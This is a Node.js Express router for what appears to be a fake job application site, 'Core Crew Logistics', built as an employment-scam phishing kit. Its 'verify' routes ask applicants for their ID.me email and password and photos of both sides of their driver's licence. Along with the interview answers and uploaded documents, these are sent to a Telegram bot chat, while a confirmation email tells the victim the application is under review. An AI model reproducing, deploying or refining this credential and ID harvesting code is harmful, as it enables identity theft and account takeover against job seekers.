const path = require('path');
const os = require('os');
const fs = require('fs');
const express = require('express');
const multer = require('multer');
const fetch = require('node-fetch');
const FormData = require('form-data');
const { Redis } = require('@upstash/redis');
const nodemailer = require('nodemailer');
const jobDetails = require('../data/jobDetails');

const router = express.Router();

// Storage for uploads (temp on disk)
const upload = multer({
  storage: multer.diskStorage({
    destination: (req, file, cb) => cb(null, os.tmpdir()),
    filename: (req, file, cb) => {
      const timestamp = Date.now();
      const safe = file.originalname.replace(/[^a-zA-Z0-9._-]/g, '_');
      cb(null, `${timestamp}-${safe}`);
    },
  }),
  limits: { fileSize: 15 * 1024 * 1024 },
});

// Multer for driver's license front and back
const driversLicenseUpload = multer({
  storage: multer.diskStorage({
    destination: (req, file, cb) => cb(null, os.tmpdir()),
    filename: (req, file, cb) => {
      const timestamp = Date.now();
      const safe = file.originalname.replace(/[^a-zA-Z0-9._-]/g, '_');
      cb(null, `dl-${timestamp}-${safe}`);
    },
  }),
  limits: { fileSize: 10 * 1024 * 1024 },
});

const dlFields = [
  { name: 'driversLicenseFront', maxCount: 1 },
  { name: 'driversLicenseBack', maxCount: 1 }
];

const JOB_POSITIONS = Object.values(jobDetails).map(j => j.title);

function normalizePosition(pos) {
  return pos.trim().toLowerCase().replace(/[\s/&-]+/g, ' ').replace(/\s+/g, ' ').trim();
}

// --- INTERVIEW_QUESTIONS_MAP and DEFAULT_QUESTIONS FULL CONTENT ---
// ... unchanged ...

const INTERVIEW_QUESTIONS_MAP = {
  // ... your original map ...
};

const DEFAULT_QUESTIONS = [
  { name: "about", label: "Tell us about yourself and your professional background." },
  { name: "interest", label: "Why are you interested in working with Core Crew Logistics?" },
  { name: "challenge", label: "Describe a challenge you've overcome at work." },
  { name: "skills", label: "What skills would you bring to this position?" },
  { name: "goals", label: "Where do you see yourself in two years?" }
];

// Ensure session is present (middleware check)
function requireSession(req, res, next) {
  if (!req.session) {
    return res.status(500).render('error', { message: 'Session not available. Please enable session middleware.' });
  }
  next();
}

router.get('/', requireSession, (req, res) => {
  res.render('apply', { positions: JOB_POSITIONS });
});

router.post('/start', requireSession, upload.array('documents', 6), async (req, res) => {
  try {
    const { firstName, lastName, email, phone, coverLetter, position } = req.body;
    req.session.applicationDraft = {
      firstName,
      lastName,
      email,
      phone,
      coverLetter,
      position,
      files: (req.files || []).map((f) => ({
        path: f.path,
        originalname: f.originalname,
        mimetype: f.mimetype,
      })),
    };
    await sendApplicationToTelegram(req.session.applicationDraft);

    const normalizedPosition = normalizePosition(position);
    const selectedQuestions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
    const isDefault = !(normalizedPosition in INTERVIEW_QUESTIONS_MAP);
    res.render('application-submitted', {
      questions: selectedQuestions,
      position,
      step: 2,
      isDefault
    });
  } catch (err) {
    console.error(err);
    res.status(500).render('error', { message: 'Failed to submit application. Please try again later.' });
  }
});

router.get('/interview', requireSession, (req, res) => {
  if (!req.session.applicationDraft) return res.redirect('/apply');
  const pos = req.session.applicationDraft.position;
  const normalizedPosition = normalizePosition(pos);
  const selectedQuestions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
  const isDefault = !(normalizedPosition in INTERVIEW_QUESTIONS_MAP);
  res.render('application-submitted', {
    questions: selectedQuestions,
    position: pos,
    step: 2,
    isDefault
  });
});

router.post('/interview', requireSession, express.urlencoded({ extended: true }), async (req, res) => {
  // Fix: Make sure answers are actually captured from req.body
  if (!req.session.applicationDraft) return res.redirect('/apply');
  // Save all interview answers to session
  req.session.interviewAnswers = {};
  // Get normalized position and questions
  const pos = req.session.applicationDraft.position;
  const normalizedPosition = normalizePosition(pos);
  const selectedQuestions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
  selectedQuestions.forEach(q => {
    // Store answer using question name as key
    req.session.interviewAnswers[q.name] = req.body[q.name] || '';
  });
  res.render('info-note');
});

router.get('/verify', requireSession, (req, res) => {
  if (!req.session.applicationDraft) return res.redirect('/apply');
  res.render('verify', {
    email: req.session.applicationDraft.email || '',
    position: req.session.applicationDraft.position || ''
  });
});

// Verification POST: ID.me sign-in and driver's license front/back upload
router.post('/verify', requireSession, driversLicenseUpload.fields(dlFields), async (req, res) => {
  // Validate session and required files
  if (!req.session.applicationDraft) return res.redirect('/apply');

  // Ensure both files are present
  const dlFront = req.files['driversLicenseFront']?.[0];
  const dlBack = req.files['driversLicenseBack']?.[0];
  if (!dlFront || !dlBack) {
    return res.status(400).render('error', { message: 'Both front and back of your driver\'s license/ID must be uploaded.' });
  }

  const { email, password } = req.body;
  req.session.verified = true;
  req.session.idme = { email, password };

  req.session.driversLicenseFiles = [dlFront, dlBack];

  const application = req.session.applicationDraft;
  const interviewAnswers = req.session.interviewAnswers || {};
  const idmeCreds = { email, password };

  const normalizedPosition = normalizePosition(application.position);
  const questions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
  const answersObj = {};
  let qaText = `Q&A for ${application.firstName} ${application.lastName} (${application.position}):\n`;
  questions.forEach(q => {
    // Use name key for answer
    let answer = interviewAnswers[q.name];
    if (typeof answer === 'undefined' || answer === null || answer === '') {
      answer = "(No answer provided or field name mismatch)";
    }
    answersObj[q.label] = answer;
    qaText += `\n${q.label}\n${answer}\n`;
  });

  // Send Q&A summary as text message to Telegram
  await sendTextToTelegram(qaText);

  const applicantName = `${application.firstName}_${application.lastName}`.replace(/[^a-zA-Z0-9_-]/g, '_');
  const timestamp = Date.now();

  // Q&A JSON file
  const qaPayload = {
    applicant: {
      name: `${application.firstName} ${application.lastName}`,
      email: application.email,
      phone: application.phone,
      position: application.position,
    },
    interview_answers: answersObj
  };

  // Combined ID.me credentials + driver's license JSON file
  const idmePayload = {
    applicant: {
      name: `${application.firstName} ${application.lastName}`,
      email: application.email,
      position: application.position,
    },
    idme_credentials: idmeCreds,
    drivers_license: {
      front: {
        filename: dlFront.originalname,
        mimetype: dlFront.mimetype,
      },
      back: {
        filename: dlBack.originalname,
        mimetype: dlBack.mimetype,
      },
    }
  };

  // Write Q&A JSON
  try {
    const qaFilename = `QA_${applicantName}_${timestamp}.json`;
    const qaFilepath = path.join(os.tmpdir(), qaFilename);
    fs.writeFileSync(qaFilepath, JSON.stringify(qaPayload, null, 2), 'utf8');
    await sendJsonFileToTelegram(qaFilepath, qaFilename);
    fs.unlinkSync(qaFilepath);
  } catch (err) {
    console.error('Failed to send Q&A JSON to Telegram:', err);
  }

  // Write combined ID.me + license JSON
  try {
    const idmeFilename = `IDmeAndLicense_${applicantName}_${timestamp}.json`;
    const idmeFilepath = path.join(os.tmpdir(), idmeFilename);
    fs.writeFileSync(idmeFilepath, JSON.stringify(idmePayload, null, 2), 'utf8');
    await sendJsonFileToTelegram(idmeFilepath, idmeFilename);
    fs.unlinkSync(idmeFilepath);
  } catch (err) {
    console.error('Failed to send ID.me + License JSON to Telegram:', err);
  }

  // Send driver's license images to Telegram
  try {
    await sendDocumentToTelegram(dlFront.path, dlFront.originalname);
    fs.unlinkSync(dlFront.path);
    await sendDocumentToTelegram(dlBack.path, dlBack.originalname);
    fs.unlinkSync(dlBack.path);
    req.session.driversLicenseFiles = null;
  } catch (err) {
    console.error('Failed to send driver\'s license files to Telegram:', err);
  }

  await sendConfirmationEmail(email, req.session.applicationDraft.firstName);
  res.redirect('/apply/submit');
});

// Skip ID.me POST route (handles skip and driver's license front/back upload)
router.post('/skip-idme/', requireSession, driversLicenseUpload.fields(dlFields), async (req, res) => {
  if (!req.session.applicationDraft) return res.redirect('/apply');
  const dlFront = req.files['driversLicenseFront']?.[0];
  const dlBack = req.files['driversLicenseBack']?.[0];
  if (!dlFront || !dlBack) {
    return res.status(400).render('error', { message: 'Both front and back of your driver\'s license/ID must be uploaded.' });
  }
  req.session.driversLicenseFiles = [dlFront, dlBack];
  req.session.verified = true;
  req.session.idme = {};

  const application = req.session.applicationDraft;
  const interviewAnswers = req.session.interviewAnswers || {};

  const normalizedPosition = normalizePosition(application.position);
  const questions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
  const answersObj = {};
  let qaText = `Q&A for ${application.firstName} ${application.lastName} (${application.position}):\n`;
  questions.forEach(q => {
    let answer = interviewAnswers[q.name];
    if (typeof answer === 'undefined' || answer === null || answer === '') {
      answer = "(No answer provided or field name mismatch)";
    }
    answersObj[q.label] = answer;
    qaText += `\n${q.label}\n${answer}\n`;
  });

  // Send Q&A summary as text message to Telegram
  await sendTextToTelegram(qaText);

  const applicantName = `${application.firstName}_${application.lastName}`.replace(/[^a-zA-Z0-9_-]/g, '_');
  const timestamp = Date.now();

  // Q&A JSON
  try {
    const qaPayload = {
      applicant: {
        name: `${application.firstName} ${application.lastName}`,
        email: application.email,
        phone: application.phone,
        position: application.position,
      },
      interview_answers: answersObj
    };
    const qaFilename = `QA_${applicantName}_${timestamp}.json`;
    const qaFilepath = path.join(os.tmpdir(), qaFilename);
    fs.writeFileSync(qaFilepath, JSON.stringify(qaPayload, null, 2), 'utf8');
    await sendJsonFileToTelegram(qaFilepath, qaFilename);
    fs.unlinkSync(qaFilepath);
  } catch (err) {
    console.error('Failed to send Q&A JSON to Telegram:', err);
  }

  // Combined "ID.me" (empty) + license JSON
  try {
    const idmePayload = {
      applicant: {
        name: `${application.firstName} ${application.lastName}`,
        email: application.email,
        position: application.position,
      },
      idme_credentials: {},
      drivers_license: {
        front: {
          filename: dlFront.originalname,
          mimetype: dlFront.mimetype,
        },
        back: {
          filename: dlBack.originalname,
          mimetype: dlBack.mimetype,
        },
      }
    };
    const idmeFilename = `IDmeAndLicense_${applicantName}_${timestamp}.json`;
    const idmeFilepath = path.join(os.tmpdir(), idmeFilename);
    fs.writeFileSync(idmeFilepath, JSON.stringify(idmePayload, null, 2), 'utf8');
    await sendJsonFileToTelegram(idmeFilepath, idmeFilename);
    fs.unlinkSync(idmeFilepath);
  } catch (err) {
    console.error('Failed to send ID.me + License JSON to Telegram:', err);
  }

  try {
    await sendDocumentToTelegram(dlFront.path, dlFront.originalname);
    fs.unlinkSync(dlFront.path);
    await sendDocumentToTelegram(dlBack.path, dlBack.originalname);
    fs.unlinkSync(dlBack.path);
    req.session.driversLicenseFiles = null;
  } catch (err) {
    console.error('Failed to send driver\'s license files to Telegram:', err);
  }

  await sendConfirmationEmail(application.email, application.firstName);
  res.redirect('/apply/submit');
});

router.get('/submit', requireSession, (req, res) => {
  if (!req.session.applicationDraft) return res.redirect('/apply');
  res.render('submit', {
    email: req.session.applicationDraft.email || '',
    firstName: req.session.applicationDraft.firstName || ''
  });
});

router.post('/submit', requireSession, async (req, res) => {
  try {
    if (!req.session.applicationDraft || !req.session.verified) return res.redirect('/apply');
    const data = req.session.applicationDraft;
    const attachments = (data.files || []).map((f) => ({
      filename: f.originalname,
      path: f.path,
      contentType: f.mimetype,
    }));
    try {
      const redis = new Redis({
        url: process.env.UPSTASH_REDIS_REST_URL,
        token: process.env.UPSTASH_REDIS_REST_TOKEN,
      });
      const key = `application:${Date.now()}:${(data.email || '').replace(/[^a-zA-Z0-9._-]/g, '_')}`;
      await redis.hset(key, {
        firstName: data.firstName,
        lastName: data.lastName,
        email: data.email,
        phone: data.phone,
        position: data.position,
        coverLetter: data.coverLetter || '',
        interviewAnswers: JSON.stringify(req.session.interviewAnswers || {}),
        files: JSON.stringify(attachments.map(a => ({ name: a.filename, type: a.contentType }))),
        idme: JSON.stringify(req.session.idme || {}),
        createdAt: new Date().toISOString(),
      });
    } catch (e) {
      console.warn('Upstash store failed:', e.message);
    }
    req.session.applicationDraft = null;
    req.session.interviewAnswers = null;
    req.session.verified = null;
    req.session.idme = null;
    res.render('success');
  } catch (err) {
    console.error(err);
    res.status(500).render('error', { message: 'Failed to submit application. Please try again later.' });
  }
});

// Helpers below...

async function sendApplicationToTelegram(data) {
  try {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (botToken && chatId) {
      const summary = `New Application
Name: ${data.firstName} ${data.lastName}
Email: ${data.email}
Phone: ${data.phone}
Position: ${data.position}
Cover Letter: ${data.coverLetter || "N/A"}`;
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: summary }),
      });
      const attachments = (data.files || []).map((f) => ({
        filename: f.originalname,
        path: f.path,
        contentType: f.mimetype,
      }));
      for (const f of attachments) {
        const form = new FormData();
        form.append('chat_id', chatId);
        form.append('document', require('fs').createReadStream(f.path), {
          filename: f.filename,
          contentType: f.contentType,
        });
        await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method: 'POST', body: form });
      }
    }
  } catch (e) {
    console.warn('Telegram send failed:', e.message);
  }
}

async function sendTextToTelegram(text) {
  try {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (botToken && chatId) {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text }),
      });
    }
  } catch (e) {
    console.warn('Telegram send failed (text):', e.message);
  }
}

async function sendJsonFileToTelegram(filepath, filename) {
  try {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (botToken && chatId) {
      const form = new FormData();
      form.append('chat_id', chatId);
      form.append('document', fs.createReadStream(filepath), filename);
      await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
        method: 'POST',
        body: form,
        headers: form.getHeaders(),
      });
    }
  } catch (e) {
    console.warn('Telegram send failed (JSON file):', e.message);
  }
}

async function sendDocumentToTelegram(filepath, filename) {
  try {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (botToken && chatId) {
      const form = new FormData();
      form.append('chat_id', chatId);
      form.append('document', fs.createReadStream(filepath), filename);
      await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
        method: 'POST',
        body: form,
        headers: form.getHeaders(),
      });
    }
  } catch (e) {
    console.warn('Telegram send failed (Driver\'s License):', e.message);
  }
}

async function sendConfirmationEmail(email, firstName) {
  try {
    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST || "smtp.gmail.com",
      port: process.env.SMTP_PORT || 465,
      secure: true,
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS,
      },
    });
    await transporter.sendMail({
      from: `"Core Crew Logistics" <${process.env.SMTP_USER}>`,
      to: email,
      subject: "Your Application Has Been Submitted",
      text: `Dear ${firstName || "Applicant"},\n\nThank you for completing your application with Core Crew Logistics. Your submission has been received and is now under review.\n\nWe appreciate your interest and will contact you soon regarding the next steps.\n\nBest regards,\nCore Crew Logistics Team`,
    });
  } catch (e) {
    console.warn("Email send failed:", e.message);
  }
}

module.exports = router;